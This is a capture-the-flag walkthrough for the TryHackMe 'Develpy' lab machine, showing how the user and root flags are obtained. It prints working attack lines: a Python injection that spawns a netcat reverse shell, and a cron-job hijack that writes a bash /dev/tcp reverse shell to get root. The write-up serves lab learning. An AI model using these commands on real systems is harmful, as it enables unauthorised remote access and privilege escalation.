# [Develpy](https://tryhackme.com/room/bsidesgtdevelpy)

## boot2root machine for FIT and bsides Guatemala CTF

# Develpy

## read user.txt and root.txt

### user.txt

1. First scan the ports to see what we can do

```Bash
nmap -p- <IP>
```

![SCREEN01](https://github.com/user-attachments/assets/37d58aae-53e4-4937-8ab9-e5d9ace93f65)

2. Port 10000 is not your standard endpoint. So let's capture it with netcat

![SCREEN02](https://github.com/user-attachments/assets/45e8f7e8-d455-4b15-83f9-485747f543a7)

```Bash
nc <IP> 10000
```

![SCREEN03](https://github.com/user-attachments/assets/74950243-7ff8-4f74-aacf-7ac0b5625544)

3. This is a python script so let's set up another listener and reverse shell

```Bash
nc -lvnp 4444
```

```Python
__import__("os").system("nc -e /bin/sh 10.10.202.50 4444")
```

```Bash
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat user.txt
```

![SCREEN04](https://github.com/user-attachments/assets/0f3e592c-ca87-4109-ae99-3767e657dbdb)

### root.txt

1. In our starting directory, there are two interesting files to examine: `run.sh` and `root.sh`

```Bash
ls -la
cat run.sh
cat root.sh
```

2. The `root.sh` file is being executed by a cron job with root privileges, but we have permission to delete it and replace it with our own reverse shell script

![SCREEN05](https://github.com/user-attachments/assets/70a561d4-fa77-4bbd-ac67-6fae5f3ba628)

```Bash
rm -f root.sh
echo 'bash -i >& /dev/tcp/10.10.202.50/5555 0>&1' > root.sh
chmod +x root.sh
```

3. Now set up a listener on our machine and wait for the cron job to execute our script

```Bash
nc -lvnp 5555
cat /root/root.txt
```

![SCREEN06](https://github.com/user-attachments/assets/2125edf3-adde-4e0a-8ee9-72ae0436a867)
